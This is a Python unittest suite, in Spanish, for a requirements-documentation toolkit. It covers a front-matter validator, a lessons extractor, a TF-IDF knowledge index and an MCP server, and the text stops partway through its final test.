#!/usr/bin/env python3
"""Suite de tests del ecosistema better-project (REQ-001..REQ-006).

stdlib unittest, sin dependencias. Ejecutar:
    python3 -m unittest discover -s tests -q
Usa directorios temporales para no tocar el estado real del repo.
"""

import argparse
import ast
import io
import json
import math
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
import urllib.error
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parent.parent
SCRIPTS = ROOT / "scripts"
sys.path.insert(0, str(SCRIPTS))

import adr_validator as av  # noqa: E402
import analyze_shell as ash  # noqa: E402
import audit_advisories as aadm  # noqa: E402
import auto_audit as aa  # noqa: E402
import diagnostico as diag  # noqa: E402
import download_jev_model as djm  # noqa: E402
import doc_validator as dv  # noqa: E402
import index_knowledge as ik  # noqa: E402
import jev_calibration as jc  # noqa: E402
import jev_calibration_merge as jcm  # noqa: E402
import jev_pillars as jp  # noqa: E402
import jev_review as jr  # noqa: E402
import lessons_extractor as le  # noqa: E402
import mcp_server as mcp  # noqa: E402
import mutation_check as mc  # noqa: E402
import tui  # noqa: E402

REQ_BODY = (
    "---\nid: {id}\ntitulo: {titulo}\nestado: {estado}\nprioridad: {prioridad}\n"
    "version: {version}\nfecha_creacion: {fecha}\n---\n# {id}\n"
)
VALID = {
    "id": "REQ-100",
    "titulo": "Requisito de prueba",
    "estado": "Aprobado",
    "prioridad": "Media",
    "version": "1.0",
    "fecha": "2026-08-06",
}


class TestDocValidator(unittest.TestCase):
    tmp: Path
    reqs: Path
    old_req_dir: Path
    old_root: Path

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.reqs = self.tmp / ".docs" / "requirements"
        self.reqs.mkdir(parents=True)
        self.old_req_dir, self.old_root = dv.REQ_DIR, dv.ROOT
        dv.REQ_DIR, dv.ROOT = self.reqs, self.tmp

    def tearDown(self):
        dv.REQ_DIR, dv.ROOT = self.old_req_dir, self.old_root

    def _req(self, rid="REQ-100", **over):
        data = {**VALID, **over, "id": rid}
        (self.reqs / f"{rid}.md").write_text(REQ_BODY.format(**data), encoding="utf-8")

    def _code(self, contenido, nombre="x.py"):
        (self.tmp / nombre).write_text(contenido, encoding="utf-8")

    def test_repo_real_sin_errores(self):
        dv.REQ_DIR, dv.ROOT = self.old_req_dir, self.old_root
        reqs = dv.collect_req_files()
        refs = dv.collect_code_refs()
        dv.analizar(reqs, refs)
        self.assertGreaterEqual(len(reqs), 6)
        self.assertEqual(dv.errors, [])
        self.assertIn("REQ-006", refs)

    def test_referencia_sin_archivo_es_error(self):
        self._req()
        self._code("# REQ-999\n")
        reqs = dv.collect_req_files()
        refs = dv.collect_code_refs()
        dv.analizar(reqs, refs)
        self.assertTrue(any("REQ-999" in e for e in dv.errors))

    def test_deprecado_referenciado_es_error(self):
        self._req(estado="Deprecado")
        self._code("# REQ-100\n")
        reqs = dv.collect_req_files()
        refs = dv.collect_code_refs()
        dv.analizar(reqs, refs)
        self.assertTrue(any("Deprecado" in e for e in dv.errors))

    def test_implementado_sin_refs_es_advertencia(self):
        self._req(estado="Implementado")
        reqs = dv.collect_req_files()
        refs = dv.collect_code_refs()
        dv.analizar(reqs, refs)
        self.assertTrue(any("REQ-100" in w and "no tiene referencias" in w for w in dv.warnings))

    def test_estado_invalido_es_error(self):
        self._req(estado="Malo")
        dv.collect_req_files()
        self.assertTrue(any("estado" in e for e in dv.errors))

    def test_id_no_coincide_con_nombre_es_error(self):
        (self.reqs / "REQ-100.md").write_text(REQ_BODY.format(**VALID), encoding="utf-8")
        (self.reqs / "REQ-100.md").write_text(
            REQ_BODY.format(**{**VALID, "id": "REQ-999"}), encoding="utf-8"
        )
        dv.collect_req_files()
        self.assertTrue(any("no coincide" in e for e in dv.errors))

    def test_prioridad_invalida_es_error(self):
        self._req(prioridad="Urgentisima")
        dv.collect_req_files()
        self.assertTrue(any("prioridad" in e for e in dv.errors))

    def test_fecha_invalida_es_error(self):
        self._req(fecha="06-08-2026")
        dv.collect_req_files()
        self.assertTrue(any("fecha_creacion" in e for e in dv.errors))

    def test_version_invalida_es_error(self):
        self._req(version="v1.0")
        dv.collect_req_files()
        self.assertTrue(any("version" in e for e in dv.errors))

    def test_coleccion_idempotente(self):
        self._req(estado="Malo")
        dv.collect_req_files()
        dv.collect_req_files()
        self.assertEqual(len([e for e in dv.errors if "estado" in e]), 1)

    def test_main_devuelve_1_con_errores(self):
        self._req(estado="Malo")
        dv.collect_req_files()
        self.assertEqual(dv.main(), 1)

    def test_demo_excluida_del_scan(self):
        reqs = dv.collect_req_files()
        refs = dv.collect_code_refs()
        dv.analizar(reqs, refs)
        self.assertEqual(dv.errors, [])
        self.assertTrue(
            all(not r.startswith("demo/") for locations in refs.values() for r in locations)
        )

    def test_root_demo_valida_proyecto_externo(self):
        proc = subprocess.run(
            [sys.executable, "scripts/doc_validator.py", "--root", "demo"],
            capture_output=True,
            text=True,
            cwd=str(ROOT),
        )
        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
        self.assertIn("3 REQs", proc.stdout)

    def test_sin_frontmatter_es_error(self):
        (self.reqs / "REQ-100.md").write_text("# sin frontmatter\n", encoding="utf-8")
        dv.collect_req_files()
        self.assertTrue(any("sin frontmatter" in e for e in dv.errors))

    def test_id_frontmatter_invalido_es_error(self):
        (self.reqs / "REQ-100.md").write_text(
            "---\nid: XX\ntitulo: T\nestado: Implementado\nprioridad: Alta\n"
            "version: 1.0\nfecha_creacion: 2026-08-06\n---\n", encoding="utf-8")
        dv.collect_req_files()
        self.assertTrue(any("'id' invalido" in e for e in dv.errors))

    def test_faltan_campos_es_error(self):
        (self.reqs / "REQ-100.md").write_text(
            "---\nid: REQ-100\ntitulo: T\nestado: Implementado\n---\n", encoding="utf-8")
        dv.collect_req_files()
        self.assertTrue(any("faltan campos" in e for e in dv.errors))

    def test_draft_referenciado_es_advertencia(self):
        self._req(estado="Draft")
        self._code("# REQ-100\n")
        reqs = dv.collect_req_files()
        refs = dv.collect_code_refs()
        dv.analizar(reqs, refs)
        self.assertTrue(any("Draft" in w for w in dv.warnings))

    def test_strict_falla_con_advertencias(self):
        self._req(estado="Implementado")  # sin referencias -> advertencia
        with mock.patch.object(sys, "argv", ["doc_validator.py", "--strict"]), \
                mock.patch.object(sys, "stdout", io.StringIO()):
            self.assertEqual(dv.main(), 1)


class TestLessonsExtractor(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.old_dir = le.LESSONS_DIR
        le.LESSONS_DIR = self.tmp

    def tearDown(self):
        le.LESSONS_DIR = self.old_dir

    def _yaml(self, contenido, nombre="2026.yaml"):
        (self.tmp / nombre).write_text(contenido, encoding="utf-8")

    def test_parser_minimo_multilinea(self):
        datos = le._minimal_parser(
            '- id: LSN-001\n  proyecto: "Mod Pago"\n  problema: "texto con dos palabras"\n'
            "  estado: Resuelta\n  fecha: 2026-08-06\n"
        )
        self.assertEqual(len(datos), 1)
        self.assertEqual(datos[0]["proyecto"], "Mod Pago")
        self.assertEqual(datos[0]["problema"], "texto con dos palabras")

    def test_parser_varias_entradas(self):
        datos = le._minimal_parser(
            "- id: LSN-001\n  estado: Abierta\n  fecha: 2026-01-01\n"
            "- id: LSN-002\n  estado: Resuelta\n  fecha: 2026-01-02\n"
        )
        self.assertEqual([d["id"] for d in datos], ["LSN-001", "LSN-002"])

    def test_campo_faltante_genera_problema(self):
        self._yaml("- id: LSN-001\n  estado: Resuelta\n  fecha: 2026-08-06\n")
        _, problems = le.validate()
        self.assertTrue(any("faltan campos" in p for p in problems))

    def test_fecha_invalida_genera_problema(self):
        self._yaml(
            "- id: LSN-001\n  proyecto: x\n  fase: y\n  categoria: z\n  problema: a\n"
            "  recomendacion: b\n  estado: Resuelta\n  fecha: ayer\n"
        )
        _, problems = le.validate()
        self.assertTrue(any("fecha" in p for p in problems))

    def test_render_context_incluye_datos(self):
        datos = [
            {"id": "LSN-001", "proyecto": "P", "fase": "F", "categoria": "C",
             "problema": "prob", "recomendacion": "rec", "estado": "Resuelta", "fecha": "2026-08-06"}
        ]
        texto = le.render_context(datos)
        self.assertIn("LSN-001", texto)
        self.assertIn("prob", texto)
        self.assertIn("rec", texto)

    def test_estado_invalido_genera_problema(self):
        self._yaml(
            "- id: LSN-001\n  proyecto: P\n  fase: F\n  categoria: C\n  problema: a\n"
            "  recomendacion: b\n  estado: EnCurso\n  fecha: 2026-08-06\n"
        )
        _, problems = le.validate()
        self.assertTrue(any("estado" in p and "invalido" in p for p in problems))

    def test_parser_linea_indentada_sin_entrada(self):
        self.assertEqual(le._minimal_parser("  clave: valor\n"), [])

    def test_main_check_no_genera_contexto(self):
        self._yaml(
            "- id: LSN-001\n  proyecto: P\n  fase: F\n  categoria: C\n  problema: a\n"
            "  recomendacion: b\n  estado: Resuelta\n  fecha: 2026-08-06\n"
        )
        buf = io.StringIO()
        with mock.patch.object(sys, "argv", ["lessons_extractor.py", "--check"]), \
                mock.patch.object(sys, "stdout", buf), \
                mock.patch.object(le, "OUTPUT", self.tmp / "ctx.txt"):
            rc = le.main()
        self.assertEqual(rc, 0)
        self.assertNotIn("lessons_context.txt", buf.getvalue())

    def test_main_json_conserva_acentos(self):
        self._yaml(
            "- id: LSN-001\n  proyecto: P\n  fase: F\n  categoria: C\n"
            "  problema: situación crítica\n  recomendacion: b\n  estado: Resuelta\n"
            "  fecha: 2026-08-06\n  fecha_resolucion: 2026-08-07\n"
        )
        buf = io.StringIO()
        with mock.patch.object(sys, "argv", ["lessons_extractor.py", "--json"]), \
                mock.patch.object(sys, "stdout", buf), \
                mock.patch.object(le, "OUTPUT", self.tmp / "ctx.txt"):
            rc = le.main()
        self.assertEqual(rc, 0)
        self.assertIn("situación", buf.getvalue())
        json.loads(buf.getvalue())

    def test_parse_yaml_con_yaml_disponible(self):
        # Verifica que _parse_yaml usa yaml.safe_load cuando esta disponible
        with mock.patch.object(le, "HAS_YAML", True):
            data = le._parse_yaml("- id: LSN-001\n  estado: Resuelta\n")
            self.assertEqual(len(data), 1)
            self.assertEqual(data[0]["id"], "LSN-001")

    def test_parse_yaml_sin_yaml(self):
        # Verifica que _parse_yaml usa _minimal_parser cuando yaml no esta disponible
        with mock.patch.object(le, "HAS_YAML", False):
            data = le._parse_yaml("- id: LSN-001\n  estado: Resuelta\n")
            self.assertEqual(len(data), 1)
            self.assertEqual(data[0]["id"], "LSN-001")

    def test_validate_yaml_parse_error(self):
        # YAML invalido genera problema
        self._yaml("{invalid yaml: [}")
        _, problems = le.validate()
        self.assertTrue(any("no se puede parsear" in p for p in problems))

    def test_validate_entrada_no_mapa(self):
        # Entrada que no es un mapa genera problema
        self._yaml("- 'no es un mapa'\n")
        _, problems = le.validate()
        self.assertTrue(any("no es un mapa" in p for p in problems))

    def test_validate_fecha_normalizada(self):
        # La fecha se normaliza a string AAAA-MM-DD
        self._yaml(
            "- id: LSN-001\n  proyecto: P\n  fase: F\n  categoria: C\n  problema: a\n"
            "  recomendacion: b\n  estado: Resuelta\n  fecha: 2026-08-06\n"
        )
        lessons, _ = le.validate()
        self.assertEqual(lessons[0]["fecha"], "2026-08-06")

    def test_render_context_ordenado_por_id(self):
        datos = [
            {"id": "LSN-002", "proyecto": "P", "fase": "F", "categoria": "C",
             "problema": "prob2", "recomendacion": "rec2", "estado": "Resuelta", "fecha": "2026-08-06"},
            {"id": "LSN-001", "proyecto": "P", "fase": "F", "categoria": "C",
             "problema": "prob1", "recomendacion": "rec1", "estado": "Resuelta", "fecha": "2026-08-06"},
        ]
        texto = le.render_context(datos)
        # LSN-001 debe aparecer antes que LSN-002
        idx1 = texto.index("LSN-001")
        idx2 = texto.index("LSN-002")
        self.assertLess(idx1, idx2)

    def test_main_check_con_errores(self):
        self._yaml("- id: LSN-001\n  estado: Resuelta\n  fecha: 2026-08-06\n")
        buf = io.StringIO()
        with mock.patch.object(sys, "argv", ["lessons_extractor.py", "--check"]), \
                mock.patch.object(sys, "stdout", buf), \
                mock.patch.object(le, "OUTPUT", self.tmp / "ctx.txt"):
            rc = le.main()
        self.assertEqual(rc, 1)
        self.assertIn("errores", buf.getvalue())

    def test_main_genera_contexto(self):
        self._yaml(
            "- id: LSN-001\n  proyecto: P\n  fase: F\n  categoria: C\n  problema: a\n"
            "  recomendacion: b\n  estado: Resuelta\n  fecha: 2026-08-06\n"
        )
        with mock.patch.object(sys, "argv", ["lessons_extractor.py"]), \
                mock.patch.object(le, "OUTPUT", self.tmp / "ctx.txt"), \
                mock.patch.object(sys, "stdout", io.StringIO()):
            rc = le.main()
        self.assertEqual(rc, 0)
        self.assertTrue((self.tmp / "ctx.txt").exists())

    def test_main_no_genera_con_errores(self):
        self._yaml("- id: LSN-001\n  estado: Resuelta\n  fecha: 2026-08-06\n")
        with mock.patch.object(sys, "argv", ["lessons_extractor.py"]), \
                mock.patch.object(le, "OUTPUT", self.tmp / "ctx.txt"), \
                mock.patch.object(sys, "stdout", io.StringIO()), \
                mock.patch.object(sys, "stderr", io.StringIO()):
            rc = le.main()
        self.assertEqual(rc, 1)
        self.assertFalse((self.tmp / "ctx.txt").exists())

    def test_clean_quita_comillas(self):
        self.assertEqual(le._clean('"valor"'), "valor")
        self.assertEqual(le._clean("'valor'"), "valor")
        self.assertEqual(le._clean("valor"), "valor")
        self.assertEqual(le._clean('  "valor"  '), "valor")

    def test_minimal_parser_valor_sin_comillas(self):
        datos = le._minimal_parser('- id: LSN-001\n  problema: valor sin comillas\n')
        self.assertEqual(datos[0]["problema"], "valor sin comillas")

    def test_minimal_parser_clave_valor_multilinea(self):
        datos = le._minimal_parser(
            '- id: LSN-001\n  problema: "linea 1"\n  recomendacion: "linea 2"\n'
        )
        self.assertEqual(datos[0]["problema"], "linea 1")
        self.assertEqual(datos[0]["recomendacion"], "linea 2")


class TestIndexKnowledge(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.know = self.tmp / "know"
        self.know.mkdir()
        self.storage = self.tmp / "storage"
        self.storage.mkdir()
        self.old = (
            ik.KNOWLEDGE_DIR, ik.STORAGE_DIR, ik.JSON_INDEX, ik.MANIFEST, ik.CHROMA_DIR, ik.SQLITE_DB,
        )
        ik.KNOWLEDGE_DIR = self.know
        ik.STORAGE_DIR = self.storage
        ik.JSON_INDEX = self.storage / "index.json"
        ik.MANIFEST = self.storage / "manifest.json"
        ik.CHROMA_DIR = self.storage / "chroma_db"
        ik.SQLITE_DB = self.storage / "knowledge.db"

    def tearDown(self):
        (
            ik.KNOWLEDGE_DIR, ik.STORAGE_DIR, ik.JSON_INDEX, ik.MANIFEST, ik.CHROMA_DIR, ik.SQLITE_DB,
        ) = self.old

    def test_chunks_por_h2(self):
        chunks = ik._chunks(
            "intro corta\n## Seccion A\ncontenido del chunk A con mas de veinte caracteres\n"
            "## Seccion B\ncontenido del chunk B con mas de veinte caracteres\n"
        )
        self.assertEqual(len(chunks), 2)
        self.assertIn("Seccion A", chunks[0])
        self.assertIn("Seccion B", chunks[1])

    def test_tokenize_quita_stopwords(self):
        tokens = ik._tokenize("El sistema de pago no funciona")
        self.assertNotIn("el", tokens)
        self.assertIn("sistema", tokens)
        self.assertIn("pago", tokens)

    def test_build_y_busqueda_tfidf(self):
        (self.know / "a.md").write_text("## Pilar requisitos\npilar requisitos trazabilidad contrato\n")
        (self.know / "b.md").write_text("## Timeout\nservidor timeout conexiones pool\n")
        n_files, n_chunks = ik.build_json_index()
        self.assertEqual(n_files, 2)
        self.assertGreaterEqual(n_chunks, 2)
        top_pilar = ik.search_json("pilar requisitos")[0]
        self.assertIn("pilar", top_pilar["contenido"])
        top_timeout = ik.search_json("timeout")[0]
        self.assertIn("timeout", top_timeout["contenido"])

    def test_chunk_id_unico_entre_homonimos(self):
        a = self.know / "architecture" / "ecosistema.md"
        b = self.know / "business-rules" / "ecosistema.md"
        a.parent.mkdir(parents=True)
        b.parent.mkdir(parents=True)
        a.write_text("## A\ncontenido\n")
        b.write_text("## B\ncontenido\n")
        self.assertNotEqual(ik._chunk_id(a, 0), ik._chunk_id(b, 0))

    def test_check_fresh(self):
        (self.know / "a.md").write_text("## A\ncontenido\n")
        ik.build_json_index()
        self.assertTrue(ik.check_fresh())
        (self.know / "b.md").write_text("## B\nnuevo\n")
        self.assertFalse(ik.check_fresh())

    def test_check_fresh_sin_indice(self):
        self.assertFalse(ik.check_fresh())

    def test_json_index_chunk_sin_palabras_utiles(self):
        (self.know / "a.md").write_text("## S\nel la los las de del y o u a en con para por\n")
        n_files, n_chunks = ik.build_json_index()
        self.assertEqual(n_files, 1)
        self.assertGreaterEqual(n_chunks, 1)

    def test_json_index_conserva_acentos(self):
        (self.know / "a.md").write_text("## Reglas\nsituación crítica de prueba\n")
        ik.build_json_index()
        self.assertIn("situación", ik.JSON_INDEX.read_text(encoding="utf-8"))

    def test_main_search_sobre_indice_json(self):
        (self.know / "a.md").write_text("## Timeout\nservidor timeout conexiones pool\n")
        ik.build_json_index()
        buf = io.StringIO()
        with mock.patch.object(ik, "_sqlite_available", return_value=False), \
                mock.patch.object(sys, "argv", ["index_knowledge.py", "search", "timeout"]), \
                mock.patch.object(sys, "stdout", buf):
            rc = ik.main()
        self.assertEqual(rc, 0)
        self.assertIn("timeout", buf.getvalue())

    def test_index_all_force_reconstruye(self):
        (self.know / "a.md").write_text("## A\ncontenido de prueba largo suficiente\n")
        ik.build_json_index()
        ik.JSON_INDEX.write_text("SENTINELA", encoding="utf-8")
        with mock.patch.object(ik, "_sqlite_available", return_value=False), \
                mock.patch.object(sys, "stdout", io.StringIO()):
            ik.index_all(force=False)
        self.assertEqual(ik.JSON_INDEX.read_text(encoding="utf-8"), "SENTINELA")
        with mock.patch.object(ik, "_sqlite_available", return_value=False), \
                mock.patch.object(sys, "stdout", io.StringIO()):
            ik.index_all(force=True)
        self.assertIn("chunks", ik.JSON_INDEX.read_text(encoding="utf-8"))

    def test_check_fresh_manifiesto_extra(self):
        (self.know / "a.md").write_text("## A\ncontenido largo suficiente para chunk\n")
        ik.build_json_index()
        m = json.loads(ik.MANIFEST.read_text(encoding="utf-8"))
        m["extra.md"] = 123.0
        ik.MANIFEST.write_text(json.dumps(m), encoding="utf-8")
        self.assertFalse(ik.check_fresh())

    def test_main_check_y_all(self):
        (self.know / "a.md").write_text("## A\ncontenido largo suficiente para chunk\n")
        with mock.patch.object(sys, "argv", ["index_knowledge.py"]), \
                mock.patch.object(sys, "stdout", io.StringIO()):
            ik.main()
        with mock.patch.object(sys, "argv", ["index_knowledge.py", "--check"]), \
                mock.patch.object(sys, "stdout", io.StringIO()):
            self.assertEqual(ik.main(), 0)
        with mock.patch.object(sys, "argv", ["index_knowledge.py", "--all"]), \
                mock.patch.object(sys, "stdout", io.StringIO()):
            self.assertEqual(ik.main(), 0)

    def test_vectors_normalizan_por_total_tokens(self):
        (self.know / "a.md").write_text("## A\nalpha beta gamma delta\n")
        (self.know / "b.md").write_text(
            "## B\nalpha iota kappa lambda mu nu xi omicron pi rho sigma tau\n"
        )
        ik.build_json_index()
        data = json.loads(ik.JSON_INDEX.read_text(encoding="utf-8"))
        pesos = {c["archivo"]: v["alpha"] for c, v in zip(data["chunks"], data["vectors"])}
        self.assertGreater(pesos[".docs/knowledge/a.md"], pesos[".docs/knowledge/b.md"])

    def test_search_json_ordena_por_score(self):
        (self.know / "a.md").write_text("## A\nalpha beta gamma delta epsilon zeta\n")
        (self.know / "b.md").write_text("## B\nalpha iota kappa lambda mu nu xi omicron\n")
        ik.build_json_index()
        resultados = ik.search_json("alpha beta")
        self.assertGreaterEqual(resultados[0]["score"], resultados[-1]["score"])
        self.assertIn("beta", resultados[0]["contenido"])

    def test_index_all_default_no_reconstruye(self):
        (self.know / "a.md").write_text("## A\ncontenido largo suficiente para chunk de prueba\n")
        ik.build_json_index()
        ik.JSON_INDEX.write_text("SENTINELA", encoding="utf-8")
        with mock.patch.object(ik, "_sqlite_available", return_value=False), \
                mock.patch.object(sys, "stdout", io.StringIO()):
            ik.index_all()
        self.assertEqual(ik.JSON_INDEX.read_text(encoding="utf-8"), "SENTINELA")

    def test_index_all_crea_storage_con_padres(self):
        nuevo = self.tmp / "nested" / "storage"
        ik.STORAGE_DIR = nuevo
        ik.JSON_INDEX = nuevo / "index.json"
        ik.MANIFEST = nuevo / "manifest.json"
        ik.CHROMA_DIR = nuevo / "chroma_db"
        ik.SQLITE_DB = nuevo / "knowledge.db"
        (self.know / "a.md").write_text("## A\ncontenido largo suficiente para chunk de prueba\n")
        with mock.patch.object(ik, "_sqlite_available", return_value=False), \
                mock.patch.object(sys, "stdout", io.StringIO()):
            ik.index_all()
        self.assertTrue(ik.JSON_INDEX.exists())

    def test_check_fresh_manifiesto_sin_indice(self):
        ik.MANIFEST.write_text("{}", encoding="utf-8")
        self.assertFalse(ik.JSON_INDEX.exists())
        self.assertFalse(ik.CHROMA_DIR.exists())
        self.assertFalse(ik.SQLITE_DB.exists())
        self.assertFalse(ik.check_fresh())

    def test_main_all_fuerza_reconstruccion(self):
        (self.know / "a.md").write_text("## A\ncontenido largo suficiente para chunk de prueba\n")
        ik.build_json_index()
        ik.JSON_INDEX.write_text("SENTINELA", encoding="utf-8")
        with mock.patch.object(ik, "_sqlite_available", return_value=False), \
                mock.patch.object(sys, "argv", ["index_knowledge.py", "--all"]), \
                mock.patch.object(sys, "stdout", io.StringIO()):
            self.assertEqual(ik.main(), 0)
        self.assertNotEqual(ik.JSON_INDEX.read_text(encoding="utf-8"), "SENTINELA")

    def test_main_search_usa_json_si_chroma_no_disponible(self):
        (self.know / "a.md").write_text("## Timeout\nservidor timeout conexiones pool\n")
        ik.build_json_index()
        ik.CHROMA_DIR.mkdir(parents=True, exist_ok=True)
        buf = io.StringIO()
        with mock.patch.object(ik, "_chroma_available", return_value=False), \
                mock.patch.object(ik, "_sqlite_available", return_value=False), \
                mock.patch.object(sys, "argv", ["index_knowledge.py", "search", "timeout"]), \
                mock.patch.object(sys, "stdout", buf):
            rc = ik.main()
        self.assertEqual(rc, 0)
        self.assertIn("timeout", buf.getvalue())


class TestMCPServer(unittest.TestCase):
    def test_next_lesson_id(self):
        self.assertEqual(mcp._next_lesson_id({"LSN-001", "LSN-003"}), "LSN-004")
        self.assertEqual(mcp._next_lesson_id(set()), "LSN-001")
        self.assertEqual(mcp._next_lesson_id({"basura"}), "LSN-001")

    def test_create_lesson_append_secuencial(self):
        with tempfile.TemporaryDirectory() as tmp:
            old_dir = mcp.LESSONS_DIR
            mcp.LESSONS_DIR = Path(tmp)
            try:
                content, is_error = mcp.handle_call(
                    "create_lesson", {"problema": "p", "recomendacion": "r"}
                )
                self.assertFalse(is_error)
                content2, _ = mcp.handle_call(
                    "create_lesson", {"problema": "p2", "recomendacion": "r2"}
                )
                archivo = Path(tmp) / "2026.yaml"
                texto = archivo.read_text(encoding="utf-8")
                self.assertEqual(texto.count("- id: LSN-"), 2)
                self.assertIn("LSN-001", content[0]["text"])
                self.assertIn("LSN-002", content2[0]["text"])
            finally:
                mcp.LESSONS_DIR = old_dir

    def test_tool_desconocida_es_error(self):
        content, is_error = mcp.handle_call("no_existe", {})
        self.assertTrue(is_error)

    def test_validate_requirements_ok(self):
        content, is_error = mcp.handle_call("validate_requirements", {})
        self.assertFalse(is_error)
        report = json.loads(content[0]["text"])
        self.assertGreaterEqual(report["requisitos"], 6)
        self.assertEqual(report["estado"], "OK")

    def test_query_demasiado_larga_es_error(self):
        content, is_error = mcp.handle_call("search_knowledge", {"query": "x" * 501})
        self.assertTrue(is_error)
        self.assertIn("limite", content[0]["text"])

    def test_query_en_el_limite_pasa_validacion(self):
        self.assertIsNone(mcp._validate_limits("search_knowledge", {"query": "x" * 500}))

    def test_k_fuera_de_rango_es_error(self):
        for k in (0, 21, "grande"):
            content, is_error = mcp.handle_call("search_knowledge", {"query": "pilar", "k": k})
            self.assertTrue(is_error, k)

    def test_campo_largo_en_create_lesson_es_error(self):
        content, is_error = mcp.handle_call(
            "create_lesson", {"problema": "p" * 2001, "recomendacion": "r"}
        )
        self.assertTrue(is_error)
        self.assertIn("problema", content[0]["text"])

    def test_audit_log_registra_llamadas(self):
        with tempfile.TemporaryDirectory() as tmp:
            old_log = mcp.AUDIT_LOG
            mcp.AUDIT_LOG = Path(tmp) / "audit.jsonl"
            try:
                mcp.handle_call("read_requirement", {"id": "REQ-001"})
                mcp.handle_call("no_existe", {})
                lineas = mcp.AUDIT_LOG.read_text(encoding="utf-8").splitlines()
                self.assertEqual(len(lineas), 2)
                ok_entry = json.loads(lineas[0])
                fail_entry = json.loads(lineas[1])
                self.assertTrue(ok_entry["ok"])
                self.assertFalse(fail_entry["ok"])
                self.assertEqual(ok_entry["tool"], "read_requirement")
                self.assertEqual(fail_entry["tool"], "no_existe")
                # solo tamanos de argumentos, nunca contenidos (P0.9)
                self.assertEqual(ok_entry["args"], {"id": 7})
                for campo in ("ts", "ms"):
                    self.assertIn(campo, ok_entry)
            finally:
                mcp.AUDIT_LOG = old_log

    def test_stdio_end_to_end(self):
        """Protocolo MCP real por stdio: initialize + tools/call + limite."""
        with tempfile.TemporaryDirectory() as tmp:
            env = {**os.environ}
            mensajes = [
                {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}},
                {"jsonrpc": "2.0", "id": 2, "method": "tools/call",
                 "params": {"name": "read_requirement", "arguments": {"id": "REQ-001"}}},
                {"jsonrpc": "2.0", "id": 3, "method": "tools/call",
                 "params": {"name": "search_knowledge",
                            "arguments": {"query": "x" * 501}}},
            ]
            entrada = "\n".join(json.dumps(m) for m in mensajes) + "\n"
            proc = subprocess.run(
                [sys.executable, str(SCRIPTS / "mcp_server.py")],
                input=entrada, capture_output=True, text=True, timeout=30,
                cwd=tmp, env=env,
            )
            self.assertEqual(proc.returncode, 0, proc.stderr)
            respuestas = {
                m["id"]: m for m in
                (json.loads(linea) for linea in proc.stdout.splitlines() if linea.strip())
            }
            self.assertEqual(respuestas[1]["result"]["serverInfo"]["name"], "better-project")
            self.assertFalse(respuestas[2]["result"]["isError"])
            self.assertIn("REQ-001", respuestas[2]["result"]["content"][0]["text"])
            # el limite de REQ-007 se aplica tambien por stdio
            self.assertTrue(respuestas[3]["result"]["isError"])
            self.assertIn("limite", respuestas[3]["result"]["content"][0]["text"])
            # la auditoria se escribio (en .docs/.storage del repo real)
            self.assertTrue(mcp.AUDIT_LOG.exists())

    def test_search_knowledge_fallback_sin_indice(self):
        with tempfile.TemporaryDirectory() as tmp:
            know = Path(tmp)
            (know / "a.md").write_text(
                "## Timeout\nservidor timeout conexiones pool timeout reintentos\n"
            )
            old_index, old_know, old_root = mcp.JSON_INDEX, mcp.KNOWLEDGE_DIR, mcp.ROOT
            mcp.JSON_INDEX = Path(tmp) / "no-index.json"
            mcp.KNOWLEDGE_DIR = know
            mcp.ROOT = know
            try:
                content = mcp.search_knowledge({"query": "timeout"})
                self.assertIn("timeout", content[0]["text"])
            finally:
                mcp.JSON_INDEX, mcp.KNOWLEDGE_DIR, mcp.ROOT = old_index, old_know, old_root

    def test_search_knowledge_sin_resultados(self):
        with tempfile.TemporaryDirectory() as tmp:
            old_index, old_know = mcp.JSON_INDEX, mcp.KNOWLEDGE_DIR
            mcp.JSON_INDEX = Path(tmp) / "no-index.json"
            mcp.KNOWLEDGE_DIR = Path(tmp) / "vacio"
            try:
                content = mcp.search_knowledge({"query": "zzz"})
                self.assertIn("sin resultados", content[0]["text"])
            finally:
                mcp.JSON_INDEX, mcp.KNOWLEDGE_DIR = old_index, old_know

    def test_read_requirement_id_invalido_y_ausente(self):
        self.assertIn("REQ-XXX", mcp.read_requirement({"id": "nope"})[0]["text"])
        self.assertIn("no existe", mcp.read_requirement({"id": "REQ-999"})[0]["text"])

    def test_validate_requirements_con_errores(self):
        doc = mcp.doc_validator
        with mock.patch.object(doc, "collect_req_files", return_value={}), \
                mock.patch.object(doc, "collect_code_refs", return_value={}), \
                mock.patch.object(doc, "analizar",
                                  side_effect=lambda r, f: doc.errors.append("boom")):
            doc.errors.clear()
            report = json.loads(mcp.validate_requirements()[0]["text"])
        self.assertEqual(report["estado"], "con errores")
        self.assertIn("boom", report["errores"])

    def test_validate_requirements_con_advertencias(self):
        doc = mcp.doc_validator
        with mock.patch.object(doc, "collect_req_files", return_value={}), \
                mock.patch.object(doc, "collect_code_refs", return_value={}), \
                mock.patch.object(doc, "analizar",
                                  side_effect=lambda r, f: doc.warnings.append("w")):
            doc.errors.clear()
            doc.warnings.clear()
            report = json.loads(mcp.validate_requirements()[0]["text"])
        self.assertEqual(report["estado"], "con advertencias")
        self.assertIn("w", report["advertencias"])

    def test_run_verification_ok_y_fallo(self):
        with mock.patch.object(mcp.subprocess, "run",
                               return_value=mock.Mock(returncode=0, stdout="todo ok", stderr="")):
            content, ok = mcp.run_verification()
        self.assertTrue(ok)
        self.assertIn("verificacion OK", content[0]["text"])

        fail = mock.Mock(returncode=2, stdout="", stderr="mal")
        with mock.patch.object(mcp.subprocess, "run", return_value=fail):
            content, ok = mcp.run_verification()
        self.assertFalse(ok)
        self.assertIn("FALLO (exit 2)", content[0]["text"])

    def test_run_verification_timeout(self):
        with mock.patch.object(mcp.subprocess, "run",
                               side_effect=subprocess.TimeoutExpired(cmd="x", timeout=1)):
            content, ok = mcp.run_verification()
        self.assertFalse(ok)
        self.assertIn("tiempo limite", content[0]["text"])

    def test_handle_call_excepcion_es_error(self):
        with tempfile.TemporaryDirectory() as tmp:
            old_log = mcp.AUDIT_LOG
            mcp.AUDIT_LOG = Path(tmp) / "a.jsonl"
            try:
                with mock.patch.object(mcp, "search_knowledge", side_effect=RuntimeError("boom")):
                    content, is_error = mcp.handle_call("search_knowledge", {"query": "x"})
                self.assertTrue(is_error)
